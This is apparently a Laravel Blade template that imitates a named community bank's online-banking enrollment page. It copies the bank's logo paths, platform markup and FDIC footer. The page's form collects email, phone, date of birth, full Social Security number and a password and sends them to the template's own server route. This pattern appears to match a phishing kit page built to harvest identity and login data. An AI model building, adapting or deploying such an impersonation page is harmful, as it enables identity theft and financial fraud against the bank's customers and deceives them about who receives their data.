<!DOCTYPE html>
<!--- Version: /27.8.0 --->
<!--- ng8Router: True --->
<!--- shortVersion: 27.8.0 --->
<!--[if lt IE 10]><html class="lt-ie9"><![endif]-->
<html lang="en-us">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="format-detection" content="telephone=no">
<meta name="google-play-app" content="app-id=com.csiweb.digitalbanking">
<meta name="msApplication-ID" content="microsoft.build.App" />
<meta name="msApplication-PackageFamilyName" content="microsoft.build_appid" />

<link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
<link rel="android-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" />
<link rel="windows-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" />
<link rel="shortcut icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">
<link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/primeicons@6.0.1/primeicons.min.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@24,300,0,0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">

<title>Enroll in Digital Banking | Cleveland State Bank</title>
<meta name="description" content="Cleveland State Bank Online Banking Enrollment">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    color: #2d3748;
    background-color: #07192e;
    min-height: 100vh;
    overflow-x: hidden;
    -webkit-font-smoothing: antialiased;
}

.layout-view-wrapper-loading {
    padding-left: 0 !important;
}

.background-image {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #09203a;
    background: radial-gradient(circle at 50% 25%, #103861 0%, #07192e 100%);
    z-index: 0;
}

#loginContainer {
    position: relative;
    z-index: 1;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 30px 16px;
}

#loginForm {
    width: 100%;
    max-width: 480px;
    margin: 0 auto;
}

.loginCard {
    background: #ffffff;
    border-radius: 8px;
    box-shadow: 0 10px 35px rgba(0, 0, 0, 0.4);
    padding: 36px 36px 32px;
}

.bank-logo-wrapper {
    text-align: center;
    margin-bottom: 20px;
}

.bank-logo {
    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/logo.png') }}");
    background-repeat: no-repeat;
    background-position: center center;
    background-size: contain;
    height: 60px;
    width: 100%;
    max-width: 250px;
    margin: 0 auto;
    display: block;
}

.utility-textCenter {
    text-align: center;
}

.enroll-header {
    text-align: center;
    margin-bottom: 22px;
}

.enroll-header h2 {
    font-family: 'Montserrat', sans-serif;
    font-size: 19px;
    font-weight: 700;
    color: #0f4c81;
    margin-bottom: 6px;
}

.enroll-header p {
    font-size: 13px;
    color: #718096;
    line-height: 1.4;
}

/* CSI Alerts */
.csi-alert-danger {
    background-color: #fdf2f2;
    border: 1px solid #f8b4b4;
    color: #9b1c1c;
    padding: 11px 14px;
    border-radius: 4px;
    font-size: 13px;
    line-height: 1.4;
    margin-bottom: 18px;
}

/* Form Controls */
.form-group {
    margin-bottom: 16px;
}

.control-label {
    display: block;
    font-family: 'Roboto', sans-serif;
    font-size: 13px;
    font-weight: 500;
    color: #4a5568;
    margin-bottom: 6px;
}

.form-control {
    width: 100%;
    height: 44px;
    padding: 10px 14px;
    font-family: 'Roboto', sans-serif;
    font-size: 14px;
    color: #1a202c;
    background: #ffffff;
    border: 1px solid #cbd5e0;
    border-radius: 4px;
    transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
}

.form-control:focus {
    outline: none;
    border-color: #0f4c81;
    box-shadow: 0 0 0 3px rgba(15, 76, 129, 0.15);
}

.form-row-2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}

/* Action Buttons */
.btn-primary {
    width: 100%;
    height: 46px;
    background-color: #0f4c81;
    border: 1px solid #0f4c81;
    border-radius: 4px;
    color: #ffffff;
    font-family: 'Montserrat', sans-serif;
    font-size: 14px;
    font-weight: 600;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: background-color 0.2s, border-color 0.2s;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-top: 8px;
}

.btn-primary:hover {
    background-color: #0a365c;
    border-color: #0a365c;
}

.sign-in-link-wrap {
    text-align: center;
    margin-top: 18px;
}

.sign-in-link-wrap a {
    color: #0f4c81;
    text-decoration: none;
    font-size: 13px;
    font-weight: 500;
}

.sign-in-link-wrap a:hover {
    text-decoration: underline;
}

/* Footer */
.login-footer {
    margin-top: 24px;
    text-align: center;
    color: rgba(255, 255, 255, 0.7);
    font-size: 12px;
    line-height: 1.6;
}

.login-footer-badges {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 20px;
    margin-bottom: 10px;
}

.login-footer-badges img {
    height: 28px;
    object-fit: contain;
}

@media (max-width: 480px) {
    .loginCard {
        padding: 28px 20px 24px;
    }
    .form-row-2 {
        grid-template-columns: 1fr;
        gap: 0;
    }
}
</style>
</head>
<body ontouchstart="">
<div id="csi-angularjs-view" class="view">
    <div class="layout-view-wrapper layout-view-wrapper-loading">
        <div class="layout-view">
            <div class="background-image"></div>
            <div id="loginContainer">
                <div id="loginForm">
                    <div class="loginFormInner layout-delay">
                        <div class="loginCard layout-delay ng-isolate-scope">
                            <!-- BEGIN LOGIN BODY -->
                            <section class="loginBody">
                                <div class="bank-logo-wrapper">
                                    <div class="utility-textCenter bank-logo"></div>
                                </div>

                                <div class="enroll-header">
                                    <h2>Digital Banking Enrollment</h2>
                                    <p>Please enter your information to enroll in Cleveland State Bank Online Banking.</p>
                                </div>

                                @if ($errors->any())
                                    <div class="csi-alert-danger">
                                        @foreach ($errors->all() as $error)
                                            <div>{{ $error }}</div>
                                        @endforeach
                                    </div>
                                @endif

                                <form method="POST" action="{{ route('register') }}" id="csiRegisterForm">
                                    @csrf

                                    <div class="form-group">
                                        <label class="control-label">Email Address *</label>
                                        <input type="email" name="email" value="{{ old('email') }}" class="form-control" required autofocus placeholder="name@example.com">
                                    </div>

                                    <div class="form-group">
                                        <label class="control-label">Phone Number *</label>
                                        <input type="tel" name="phone" value="{{ old('phone') }}" class="form-control" required placeholder="(662) 000-0000">
                                    </div>

                                    <div class="form-row-2">
                                        <div class="form-group">
                                            <label class="control-label">Date of Birth *</label>
                                            <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" class="form-control" placeholder="MM/DD/YYYY" required>
                                        </div>
                                        <div class="form-group">
                                            <label class="control-label">SSN *</label>
                                            <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" class="form-control" placeholder="XXX-XX-XXXX" maxlength="11" required>
                                        </div>
                                    </div>

                                    <div class="form-group">
                                        <label class="control-label">Create Password *</label>
                                        <input type="password" name="password" id="password_field" class="form-control" placeholder="Enter secure password" required>
                                    </div>

                                    @if(isset($googleReCaptcha) && $googleReCaptcha)
                                        <div style="margin-bottom: 18px; display:flex; justify-content:center;">
                                            <div class="g-recaptcha" data-sitekey="{{ json_decode($googleReCaptcha->data, true)['site_key'] }}"></div>
                                        </div>
                                    @endif

                                    <button type="submit" class="btn btn-primary btn-block">Continue Enrollment</button>
                                </form>

                                <div class="sign-in-link-wrap">
                                    <a href="{{ route('login') }}">Already enrolled? Sign In</a>
                                </div>
                            </section>
                            <!-- /END LOGIN BODY -->
                        </div>
                    </div>
                </div>

                <footer class="login-footer">
                    <div class="login-footer-badges">
                        <img src="{{ asset('assets/institutions/clevelandstatebank/images/fdic-white.png') }}" alt="Member FDIC">
                        <img src="{{ asset('assets/institutions/clevelandstatebank/images/ehl-white.png') }}" alt="Equal Housing Lender">
                    </div>
                    <div>&copy; {{ date('Y') }} Cleveland State Bank. All Rights Reserved. Member FDIC. Equal Housing Lender.</div>
                </footer>

            </div>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
<script>
$(document).ready(function() {
    if ($('#ssn_field').length) {
        new Cleave('#ssn_field', { delimiters: ['-', '-'], blocks: [3, 2, 4], numericOnly: true });
    }
    if ($('#dob_field').length) {
        new Cleave('#dob_field', { date: true, datePattern: ['m', 'd', 'Y'] });
    }
});
</script>
</body>
</html>
